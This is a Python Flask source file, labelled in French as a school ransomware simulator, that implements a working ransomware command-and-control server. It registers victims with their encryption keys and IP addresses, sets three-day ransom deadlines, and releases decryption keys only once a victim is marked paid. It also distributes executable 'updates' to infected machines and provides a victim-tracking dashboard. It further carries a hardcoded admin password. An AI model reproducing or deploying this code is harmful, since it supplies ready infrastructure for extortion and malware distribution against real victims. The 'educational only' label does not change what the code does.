#!/usr/bin/env python3
"""
Serveur de contrôle C&C pour le simulateur de ransomware
À des fins éducatives uniquement - Projet scolaire
"""

import os
import sys
import json
import base64
import logging
import time
import uuid
from datetime import datetime, timedelta
from flask import Flask, request, jsonify, render_template, redirect, url_for, send_file, session
import sqlite3
from functools import wraps
# Configuration
DEBUG = True
PORT = 5000
HOST = '127.0.0.1'  # Écouter uniquement sur localhost pour la sécurité
DATABASE_FILE = 'ransomware_db.sqlite'
ADMIN_PASSWORD = 'admin123'  # À changer pour un environnement réel

# Initialisation de l'application
app = Flask(__name__)
app.secret_key = os.urandom(24)  # Clé pour sécuriser les sessions

# Configuration du logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("server.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Initialisation de la base de données
def init_db():
    with sqlite3.connect(DATABASE_FILE) as conn:
        c = conn.cursor()
        c.execute('''
        CREATE TABLE IF NOT EXISTS victims (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            uuid TEXT UNIQUE NOT NULL,
            encryption_key TEXT NOT NULL,
            ip_address TEXT,
            infection_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            payment_status INTEGER DEFAULT 0,
            payment_date TIMESTAMP,
            deadline TIMESTAMP,
            files_count INTEGER DEFAULT 0,
            version TEXT
        )
        ''')
        
        c.execute('''
        CREATE TABLE IF NOT EXISTS updates (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            version TEXT UNIQUE NOT NULL,
            file_path TEXT NOT NULL,
            release_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            description TEXT
        )
        ''')
        
        conn.commit()

# Fonction pour vérifier l'authentification admin
def check_admin_auth(password):
    return password == ADMIN_PASSWORD

# Décorateur pour protéger les routes
# Décorateur pour protéger les routes - version corrigée
def login_required(f):
    @wraps(f)  # Ajouter cette ligne pour préserver les métadonnées de la fonction
    def decorated_function(*args, **kwargs):
        if not session.get('authenticated'):
            return redirect(url_for('index'))
        return f(*args, **kwargs)
    return decorated_function

# Routes API pour le ransomware
@app.route('/register', methods=['POST'])
def register_victim():
    """Endpoint pour l'enregistrement initial d'une victime"""
    try:
        data = request.json
        if not data or 'uuid' not in data or 'key' not in data:
            return jsonify({'status': 'error', 'message': 'Invalid data'}), 400
        
        uuid = data.get('uuid')
        key = data.get('key')
        version = data.get('version', '1.0.0')
        ip_address = request.remote_addr
        
        with sqlite3.connect(DATABASE_FILE) as conn:
            c = conn.cursor()
            
            # Vérifier si cette victime existe déjà
            c.execute('SELECT * FROM victims WHERE uuid = ?', (uuid,))
            existing = c.fetchone()
            
            if existing:
                logger.info(f"Victim {uuid} already registered, updating information")
                c.execute('''
                UPDATE victims SET 
                    encryption_key = ?, 
                    version = ?, 
                    ip_address = ? 
                WHERE uuid = ?
                ''', (key, version, ip_address, uuid))
            else:
                # Créer une nouvelle entrée avec une date limite de 3 jours
                deadline = datetime.now() + timedelta(days=3)
                c.execute('''
                INSERT INTO victims (uuid, encryption_key, ip_address, version, deadline)
                VALUES (?, ?, ?, ?, ?)
                ''', (uuid, key, ip_address, version, deadline))
            
            conn.commit()
        
        logger.info(f"Victim registered/updated: {uuid} from {ip_address}")
        return jsonify({'status': 'success', 'message': 'Registration successful'}), 201
    
    except Exception as e:
        logger.error(f"Error in register_victim: {str(e)}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/key/<uuid>', methods=['GET'])
def get_key(uuid):
    """Endpoint pour récupérer la clé de déchiffrement"""
    try:
        with sqlite3.connect(DATABASE_FILE) as conn:
            c = conn.cursor()
            c.execute('SELECT encryption_key, payment_status FROM victims WHERE uuid = ?', (uuid,))
            result = c.fetchone()
            
            if not result:
                return jsonify({'status': 'error', 'message': 'Victim not found'}), 404
            
            key, payment_status = result
            
            # Vérifier si le paiement a été effectué
            if not payment_status:
                return jsonify({'status': 'error', 'message': 'Payment required'}), 402
            
            # Journaliser la récupération de clé
            logger.info(f"Key retrieved for {uuid}")
            
            return jsonify({
                'status': 'success',
                'key': key
            })
    
    except Exception as e:
        logger.error(f"Error in get_key: {str(e)}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/update/check', methods=['GET'])
def check_update():
    """Endpoint pour vérifier les mises à jour disponibles"""
    try:
        current_version = request.args.get('version', '1.0.0')
        
        with sqlite3.connect(DATABASE_FILE) as conn:
            c = conn.cursor()
            c.execute('SELECT version, description FROM updates ORDER BY release_date DESC LIMIT 1')
            result = c.fetchone()
            
            if not result:
                return jsonify({'status': 'no_update', 'current_version': current_version})
            
            latest_version, description = result
            
            # Comparaison simple des versions
            if latest_version > current_version:
                return jsonify({
                    'status': 'update_available',
                    'current_version': current_version,
                    'latest_version': latest_version,
                    'description': description
                })
            
            return jsonify({'status': 'no_update', 'current_version': current_version})
    
    except Exception as e:
        logger.error(f"Error in check_update: {str(e)}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/update/download/<version>', methods=['GET'])
def download_update(version):
    """Endpoint pour télécharger une mise à jour"""
    try:
        with sqlite3.connect(DATABASE_FILE) as conn:
            c = conn.cursor()
            c.execute('SELECT file_path FROM updates WHERE version = ?', (version,))
            result = c.fetchone()
            
            if not result or not os.path.exists(result[0]):
                return jsonify({'status': 'error', 'message': 'Update not found'}), 404
            
            return send_file(result[0], as_attachment=True)
    
    except Exception as e:
        logger.error(f"Error in download_update: {str(e)}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

# Interface d'administration Web
@app.route('/')
def index():
    """Page d'accueil / Connexion"""
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    """Traiter la connexion"""
    password = request.form.get('password')
    
    if check_admin_auth(password):
        session['authenticated'] = True
        return redirect(url_for('dashboard'))
    
    return render_template('login.html', error='Invalid password')

@app.route('/logout')
def logout():
    """Déconnexion"""
    session.pop('authenticated', None)
    return redirect(url_for('index'))

@app.route('/dashboard')
@login_required
def dashboard():
    """Tableau de bord d'administration"""
    with sqlite3.connect(DATABASE_FILE) as conn:
        conn.row_factory = sqlite3.Row
        c = conn.cursor()
        c.execute('SELECT * FROM victims ORDER BY infection_date DESC')
        victims = c.fetchall()
        
        c.execute('SELECT COUNT(*) FROM victims')
        total_victims = c.fetchone()[0]
        
        c.execute('SELECT COUNT(*) FROM victims WHERE payment_status = 1')
        total_paid = c.fetchone()[0]
        
        c.execute('SELECT COUNT(*) FROM victims WHERE infection_date > datetime("now", "-1 day")')
        recent_infections = c.fetchone()[0]
    
    return render_template('dashboard.html', 
                           victims=victims, 
                           total_victims=total_victims,
                           total_paid=total_paid,
                           recent_infections=recent_infections)

@app.route('/victim/<uuid>')
@login_required
def victim_details(uuid):
    """Détails d'une victime"""
    with sqlite3.connect(DATABASE_FILE) as conn:
        conn.row_factory = sqlite3.Row
        c = conn.cursor()
        c.execute('SELECT * FROM victims WHERE uuid = ?', (uuid,))
        victim = c.fetchone()
        
        if not victim:
            return "Victim not found", 404
    
    return render_template('victim.html', victim=victim)

@app.route('/mark_paid/<uuid>', methods=['POST'])
@login_required
def mark_paid(uuid):
    """Marquer une victime comme ayant payé"""
    with sqlite3.connect(DATABASE_FILE) as conn:
        c = conn.cursor()
        c.execute('UPDATE victims SET payment_status = 1, payment_date = CURRENT_TIMESTAMP WHERE uuid = ?', (uuid,))
        conn.commit()
        
        # Vérifier que la mise à jour a fonctionné
        c.execute('SELECT payment_status FROM victims WHERE uuid = ?', (uuid,))
        result = c.fetchone()
        
        if not result:
            return jsonify({'status': 'error', 'message': 'Victim not found'}), 404
            
        if result[0] == 1:
            logger.info(f"Victim {uuid} marked as paid")
            return jsonify({'status': 'success'})
        else:
            return jsonify({'status': 'error', 'message': 'Failed to update payment status'}), 500

@app.route('/delete/<uuid>', methods=['POST'])
@login_required
def delete_victim(uuid):
    """Supprimer une victime de la base de données"""
    with sqlite3.connect(DATABASE_FILE) as conn:
        c = conn.cursor()
        c.execute('DELETE FROM victims WHERE uuid = ?', (uuid,))
        conn.commit()
        
        logger.info(f"Victim {uuid} deleted from database")
        return jsonify({'status': 'success'})

@app.route('/updates')
@login_required
def updates_page():
    """Page de gestion des mises à jour"""
    with sqlite3.connect(DATABASE_FILE) as conn:
        conn.row_factory = sqlite3.Row
        c = conn.cursor()
        c.execute('SELECT * FROM updates ORDER BY release_date DESC')
        updates = c.fetchall()
    
    return render_template('updates.html', updates=updates)

@app.route('/upload_update', methods=['POST'])
@login_required
def upload_update():
    """Télécharger une nouvelle mise à jour"""
    version = request.form.get('version')
    description = request.form.get('description', '')
    file = request.files.get('update_file')
    
    if not version or not file:
        return jsonify({'status': 'error', 'message': 'Version and file are required'}), 400
    
    # Créer le répertoire des mises à jour si nécessaire
    os.makedirs('updates', exist_ok=True)
    
    # Sauvegarder le fichier
    file_path = os.path.join('updates', f'update_{version}.exe')
    file.save(file_path)
    
    with sqlite3.connect(DATABASE_FILE) as conn:
        c = conn.cursor()
        c.execute('INSERT INTO updates (version, file_path, description) VALUES (?, ?, ?)',
                 (version, file_path, description))
        conn.commit()
    
    logger.info(f"New update {version} uploaded")
    return redirect(url_for('updates_page'))

# Templates HTML
@app.route('/templates/<template>')
def get_template(template):
    """Route pour les templates (pour la démonstration seulement)"""
    try:
        return render_template(f'{template}.html')
    except:
        return "Template not found", 404

# Créer les templates HTML de base
def create_templates():
    """Créer les templates HTML si absents"""
    os.makedirs('templates', exist_ok=True)
    
    # Template de login
    login_html = '''
<!DOCTYPE html>
<html>
<head>
    <title>Ransomware C&C - Login</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #121212;
            color: #f0f0f0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background-color: #1e1e1e;
            padding: 2rem;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.5);
            width: 300px;
        }
        h1 {
            color: #ff4444;
            text-align: center;
            margin-bottom: 1.5rem;
        }
        .form-group {
            margin-bottom: 1rem;
        }
        label {
            display: block;
            margin-bottom: 0.5rem;
        }
        input[type="password"] {
            width: 100%;
            padding: 0.5rem;
            border: 1px solid #333;
            border-radius: 4px;
            background-color: #333;
            color: white;
        }
        button {
            width: 100%;
            padding: 0.5rem;
            background-color: #ff4444;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        button:hover {
            background-color: #ff6666;
        }
        .error {
            color: #ff4444;
            margin-top: 1rem;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h1>Ransomware C&C</h1>
        <form action="/login" method="post">
            <div class="form-group">
                <label for="password">Administrator Password</label>
                <input type="password" id="password" name="password" required>
            </div>
            {% if error %}
            <div class="error">{{ error }}</div>
            {% endif %}
            <button type="submit">Login</button>
        </form>
    </div>
</body>
</html>
    '''
    
    # Template du tableau de bord
    dashboard_html = '''
<!DOCTYPE html>
<html>
<head>
    <title>Ransomware C&C - Dashboard</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #121212;
            color: #f0f0f0;
            margin: 0;
            padding: 0;
        }
        .header {
            background-color: #1a1a1a;
            padding: 1rem;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid #333;
        }
        .header h1 {
            color: #ff4444;
            margin: 0;
        }
        .container {
            padding: 1rem;
        }
        .stats {
            display: flex;
            gap: 1rem;
            margin-bottom: 1rem;
        }
        .stat-card {
            background-color: #1e1e1e;
            padding: 1rem;
            border-radius: 8px;
            flex: 1;
        }
        .stat-card h2 {
            margin-top: 0;
            color: #ff4444;
        }
        .stat-card p {
            font-size: 1.5rem;
            font-weight: bold;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            background-color: #1e1e1e;
            border-radius: 8px;
        }
        th, td {
            padding: 0.75rem;
            text-align: left;
            border-bottom: 1px solid #333;
        }
        th {
            background-color: #2a2a2a;
        }
        tr:hover {
            background-color: #2c2c2c;
        }
        .badge {
            padding: 0.25rem 0.5rem;
            border-radius: 4px;
            font-size: 0.8rem;
        }
        .badge-success {
            background-color: #28a745;
        }
        .badge-danger {
            background-color: #dc3545;
        }
        .actions {
            display: flex;
            gap: 0.5rem;
        }
        .btn {
            padding: 0.25rem 0.5rem;
            border-radius: 4px;
            color: white;
            text-decoration: none;
            cursor: pointer;
            border: none;
            font-size: 0.8rem;
        }
        .btn-primary {
            background-color: #007bff;
        }
        .btn-success {
            background-color: #28a745;
        }
        .btn-danger {
            background-color: #dc3545;
        }
        .btn:hover {
            opacity: 0.9;
        }
        .menu {
            display: flex;
            gap: 1rem;
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>Ransomware Control Panel</h1>
        <div class="menu">
            <a href="/dashboard" class="btn btn-primary">Dashboard</a>
            <a href="/updates" class="btn btn-primary">Updates</a>
            <a href="/logout" class="btn btn-danger">Logout</a>
        </div>
    </div>
    <div class="container">
        <div class="stats">
            <div class="stat-card">
                <h2>Total Victims</h2>
                <p>{{ total_victims }}</p>
            </div>
            <div class="stat-card">
                <h2>Payments Received</h2>
                <p>{{ total_paid }}</p>
            </div>
            <div class="stat-card">
                <h2>New Infections (24h)</h2>
                <p>{{ recent_infections }}</p>
            </div>
        </div>
        
        <h2>Victims</h2>
        <table>
            <thead>
                <tr>
                    <th>UUID</th>
                    <th>IP Address</th>
                    <th>Infection Date</th>
                    <th>Payment Status</th>
                    <th>Actions</th>
                </tr>
            </thead>
            <tbody>
                {% for victim in victims %}
                <tr>
                    <td>{{ victim.uuid }}</td>
                    <td>{{ victim.ip_address }}</td>
                    <td>{{ victim.infection_date }}</td>
                    <td>
                        {% if victim.payment_status %}
                        <span class="badge badge-success">Paid</span>
                        {% else %}
                        <span class="badge badge-danger">Unpaid</span>
                        {% endif %}
                    </td>
                    <td class="actions">
                        <a href="/victim/{{ victim.uuid }}" class="btn btn-primary">Details</a>
                        {% if not victim.payment_status %}
                        <button class="btn btn-success mark-paid" data-uuid="{{ victim.uuid }}">Mark Paid</button>
                        {% endif %}
                        <button class="btn btn-danger delete-victim" data-uuid="{{ victim.uuid }}">Delete</button>
                    </td>
                </tr>
                {% endfor %}
            </tbody>
        </table>
    </div>

    <script>
        // Fonction pour marquer comme payé
        document.querySelectorAll('.mark-paid').forEach(button => {
            button.addEventListener('click', function() {
                const uuid = this.getAttribute('data-uuid');
                if (confirm('Mark this victim as paid?')) {
                    const form = document.createElement('form');
                    form.method = 'POST';
                    form.action = `/mark_paid/${uuid}`;
                    document.body.appendChild(form);
                    form.submit();
                }
            });
        });
        
        // Fonction pour supprimer
        document.querySelectorAll('.delete-victim').forEach(button => {
            button.addEventListener('click', function() {
                const uuid = this.getAttribute('data-uuid');
                if (confirm('Are you sure you want to delete this victim?')) {
                    const form = document.createElement('form');
                    form.method = 'POST';
                    form.action = `/delete/${uuid}`;
                    document.body.appendChild(form);
                    form.submit();
                }
            });
        });
    </script>
</body>
</html>
    '''
    
    # Template de détails de victime
    victim_html = '''
<!DOCTYPE html>
<html>
<head>
    <title>Victim Details - Ransomware C&C</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #121212;
            color: #f0f0f0;
            margin: 0;
            padding: 0;
        }
        .header {
            background-color: #1a1a1a;
            padding: 1rem;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid #333;
        }
        .header h1 {
            color: #ff4444;
            margin: 0;
        }
        .container {
            padding: 1rem;
        }
        .back-link {
            margin-bottom: 1rem;
            display: inline-block;
            color: #007bff;
            text-decoration: none;
        }
        .detail-card {
            background-color: #1e1e1e;
            padding: 1rem;
            border-radius: 8px;
            margin-bottom: 1rem;
        }
        .detail-card h2 {
            margin-top: 0;
            color: #ff4444;
            margin-bottom: 1rem;
        }
        .detail-row {
            display: flex;
            margin-bottom: 0.5rem;
        }
        .detail-label {
            font-weight: bold;
            width: 150px;
        }
        .detail-value {
            flex: 1;
        }
        .encryption-key {
            background-color: #2a2a2a;
            padding: 0.5rem;
            border-radius: 4px;
            font-family: monospace;
            margin-top: 0.5rem;
            word-break: break-all;
        }
        .badge {
            padding: 0.25rem 0.5rem;
            border-radius: 4px;
            font-size: 0.8rem;
        }
        .badge-success {
            background-color: #28a745;
        }
        .badge-danger {
            background-color: #dc3545;
        }
        .btn {
            padding: 0.5rem 1rem;
            border-radius: 4px;
            color: white;
            text-decoration: none;
            cursor: pointer;
            border: none;
            display: inline-block;
            margin-right: 0.5rem;
        }
        .btn-success {
            background-color: #28a745;
        }
        .btn-danger {
            background-color: #dc3545;
        }
        .btn-primary {
            background-color: #007bff;
        }
        .menu {
            display: flex;
            gap: 1rem;
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>Victim Details</h1>
        <div class="menu">
            <a href="/dashboard" class="btn btn-primary">Dashboard</a>
            <a href="/updates" class="btn btn-primary">Updates</a>
            <a href="/logout" class="btn btn-danger">Logout</a>
        </div>
    </div>
    <div class="container">
        <a href="/dashboard" class="back-link">&larr; Back to Dashboard</a>
        
        <div class="detail-card">
            <h2>Victim Information</h2>
            <div class="detail-row">
                <div class="detail-label">UUID:</div>
                <div class="detail-value">{{ victim.uuid }}</div>
            </div>
            <div class="detail-row">
                <div class="detail-label">IP Address:</div>
                <div class="detail-value">{{ victim.ip_address }}</div>
            </div>
            <div class="detail-row">
                <div class="detail-label">Infection Date:</div>
                <div class="detail-value">{{ victim.infection_date }}</div>
            </div>
            <div class="detail-row">
                <div class="detail-label">Deadline:</div>
                <div class="detail-value">{{ victim.deadline }}</div>
            </div>
            <div class="detail-row">
                <div class="detail-label">Payment Status:</div>
                <div class="detail-value">
                    {% if victim.payment_status %}
                    <span class="badge badge-success">Paid</span>
                    {% else %}
                    <span class="badge badge-danger">Unpaid</span>
                    {% endif %}
                </div>
            </div>
            {% if victim.payment_status %}
            <div class="detail-row">
                <div class="detail-label">Payment Date:</div>
                <div class="detail-value">{{ victim.payment_date }}</div>
            </div>
            {% endif %}
            <div class="detail-row">
                <div class="detail-label">Client Version:</div>
                <div class="detail-value">{{ victim.version }}</div>
            </div>
            <div class="detail-row">
                <div class="detail-label">Encryption Key:</div>
                <div class="detail-value">
                    <div class="encryption-key">{{ victim.encryption_key }}</div>
                </div>
            </div>
        </div>
        
        <div class="actions">
            {% if not victim.payment_status %}
            <button class="btn btn-success" id="mark-paid">Mark as Paid</button>
            {% endif %}
            <button class="btn btn-danger" id="delete-victim">Delete Victim</button>
        </div>
    </div>

    <script>
        // Fonction pour marquer comme payé
        document.getElementById('mark-paid')?.addEventListener('click', function() {
            if (confirm('Mark this victim as paid?')) {
                const form = document.createElement('form');
                form.method = 'POST';
                form.action = `/mark_paid/{{ victim.uuid }}`;
                document.body.appendChild(form);
                form.submit();
            }
        });
        
        // Fonction pour supprimer
        document.getElementById('delete-victim').addEventListener('click', function() {
            if (confirm('Are you sure you want to delete this victim?')) {
                const form = document.createElement('form');
                form.method = 'POST';
                form.action = `/delete/{{ victim.uuid }}`;
                document.body.appendChild(form);
                form.submit();
            }
        });
    </script>
</body>
</html>
    '''
    
    # Template de mises à jour
    updates_html = '''
<!DOCTYPE html>
<html>
<head>
    <title>Updates Management - Ransomware C&C</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #121212;
            color: #f0f0f0;
            margin: 0;
            padding: 0;
        }
        .header {
            background-color: #1a1a1a;
            padding: 1rem;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid #333;
        }
        .header h1 {
            color: #ff4444;
            margin: 0;
        }
        .container {
            padding: 1rem;
        }
        .card {
            background-color: #1e1e1e;
            padding: 1rem;
            border-radius: 8px;
            margin-bottom: 1rem;
        }
        .card h2 {
            margin-top: 0;
            color: #ff4444;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            background-color: #1e1e1e;
            border-radius: 8px;
        }
        th, td {
            padding: 0.75rem;
            text-align: left;
            border-bottom: 1px solid #333;
        }
        th {
            background-color: #2a2a2a;
        }
        tr:hover {
            background-color: #2c2c2c;
        }
        .form-group {
            margin-bottom: 1rem;
        }
        label {
            display: block;
            margin-bottom: 0.5rem;
        }
        input[type="text"], input[type="file"], textarea {
width: 100%;
            padding: 0.5rem;
            border: 1px solid #333;
            border-radius: 4px;
            background-color: #333;
            color: white;
            box-sizing: border-box;
        }
        textarea {
            min-height: 100px;
            resize: vertical;
        }
        .btn {
            padding: 0.5rem 1rem;
            border-radius: 4px;
            color: white;
            text-decoration: none;
            cursor: pointer;
            border: none;
        }
        .btn-primary {
            background-color: #007bff;
        }
        .btn-success {
            background-color: #28a745;
        }
        .btn-danger {
            background-color: #dc3545;
        }
        .menu {
            display: flex;
            gap: 1rem;
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>Updates Management</h1>
        <div class="menu">
            <a href="/dashboard" class="btn btn-primary">Dashboard</a>
            <a href="/updates" class="btn btn-primary">Updates</a>
            <a href="/logout" class="btn btn-danger">Logout</a>
        </div>
    </div>
    <div class="container">
        <div class="card">
            <h2>Upload New Update</h2>
            <form action="/upload_update" method="post" enctype="multipart/form-data">
                <div class="form-group">
                    <label for="version">Version Number</label>
                    <input type="text" id="version" name="version" placeholder="e.g. 1.0.1" required>
                </div>
                <div class="form-group">
                    <label for="description">Description</label>
                    <textarea id="description" name="description" placeholder="What's new in this version"></textarea>
                </div>
                <div class="form-group">
                    <label for="update_file">Update File (EXE)</label>
                    <input type="file" id="update_file" name="update_file" accept=".exe" required>
                </div>
                <button type="submit" class="btn btn-success">Upload Update</button>
            </form>
        </div>
        
        <h2>Available Updates</h2>
        <table>
            <thead>
                <tr>
                    <th>Version</th>
                    <th>Release Date</th>
                    <th>Description</th>
                    <th>File Path</th>
                </tr>
            </thead>
            <tbody>
                {% for update in updates %}
                <tr>
                    <td>{{ update.version }}</td>
                    <td>{{ update.release_date }}</td>
                    <td>{{ update.description }}</td>
                    <td>{{ update.file_path }}</td>
                </tr>
                {% endfor %}
            </tbody>
        </table>
    </div>
</body>
</html>
'''
# Écrire les templates dans leurs fichiers respectifs
    with open('templates/login.html', 'w', encoding='utf-8') as f:
        f.write(login_html)
    
    with open('templates/dashboard.html', 'w', encoding='utf-8') as f:
        f.write(dashboard_html)
    
    with open('templates/victim.html', 'w', encoding='utf-8') as f:
        f.write(victim_html)
    
    with open('templates/updates.html', 'w', encoding='utf-8') as f:
        f.write(updates_html)


# Point d'entrée principal
if __name__ == '__main__':
    # Initialiser la base de données
    init_db()
    
    # Créer les templates s'ils n'existent pas
    create_templates()
    
    # Créer le dossier de mises à jour
    os.makedirs('updates', exist_ok=True)
    
    print(f"Serveur démarré sur http://{HOST}:{PORT}")
    print(f"Mot de passe admin: {ADMIN_PASSWORD}")
    
    # Démarrer le serveur
    app.run(host=HOST, port=PORT, debug=DEBUG)